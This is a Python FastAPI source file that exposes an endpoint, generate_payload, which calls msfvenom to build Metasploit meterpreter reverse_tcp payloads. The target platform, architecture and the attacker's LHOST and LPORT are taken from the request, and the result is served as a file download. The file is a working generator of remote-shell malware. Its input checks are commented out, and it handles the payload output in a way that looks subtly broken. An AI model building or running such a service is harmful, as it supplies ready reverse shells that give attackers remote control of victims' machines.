from fastapi import APIRouter, HTTPException
from fastapi.responses import StreamingResponse
import subprocess
import io
from Data.data import PayloadInfo

router = APIRouter()
@router.post("/generate_payload")
async def generate_payload(info:PayloadInfo):
    # NO_ARCH_PLATFORM = {"windows","python", "php", "java", "android"}
    # ARCH_PLATFORM = {"linux"}
    # x64_ARCH_PLATFORM = {"windows", "osx", "linux"}
    # if info.platform in NO_ARCH_PLATFORM and info.arch == "x64":
    #     raise HTTPException(status_code=400, detail=f"Platform {info.platform} does not support architecture specification. Please empty arch variable.")
    # if not info.arch and info.platform in ARCH_PLATFORM:
    #     raise HTTPException(status_code=400, detail=f"Platform {info.platform} requires architecture specification. Please specify arch variable.")
    info.arch = f"/{info.arch}" if info.arch else ""
    command = [
        "msfvenom",
        "-p", f"{info.platform}{info.arch}/meterpreter/reverse_tcp",
        f"LHOST={info.LHOST}",
        f"LPORT={info.LPORT}",
        "-f", "raw"
    ]

    try:
        process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        payload = process.stdout

        payload = io.BytesIO(payload.encode('utf-8'))

        return StreamingResponse(payload, media_type='application/octet-stream', headers={'Content-Disposition': 'attachment; filename="payload.py"'})
    except subprocess.CalledProcessError as e:
        raise HTTPException(status_code=500, detail=f"Error: {e.stderr}")
    except Exception as e:
        print(e)
        raise HTTPException(status_code=500, detail=f"There was an error while generating the payload.")

